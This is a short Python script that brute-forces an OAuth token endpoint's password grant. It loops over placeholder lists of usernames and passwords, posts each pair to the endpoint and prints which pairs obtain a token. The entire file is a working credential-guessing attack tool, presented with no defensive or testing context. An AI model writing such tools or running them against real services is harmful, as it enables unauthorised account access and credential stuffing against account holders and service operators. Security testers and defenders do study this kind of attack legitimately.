import requests

# Define the OAuth token endpoint
token_endpoint = "https://api.example.com/oauth/token"

# Define a list of usernames and passwords to try
usernames = ["user1", "user2", "user3"]
passwords = ["password1", "password2", "password3"]

def brute_force_oauth_tokens():
    for username in usernames:
        for password in passwords:
            # Prepare the payload with username and password
            data = {
                "grant_type": "password",
                "username": username,
                "password": password,
            }

            try:
                # Send a POST request to the token endpoint
                response = requests.post(token_endpoint, data=data)

                # Check the response status code
                if response.status_code == 200:
                    print(f"OAuth token successfully obtained for {username}:{password}")
                elif response.status_code == 400:
                    print(f"Invalid credentials for {username}:{password}")
                else:
                    print(f"Failed to obtain OAuth token for {username}:{password}. Status Code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"An error occurred while making the request for {username}:{password}: {str(e)}")

if __name__ == "__main__":
    brute_force_oauth_tokens()
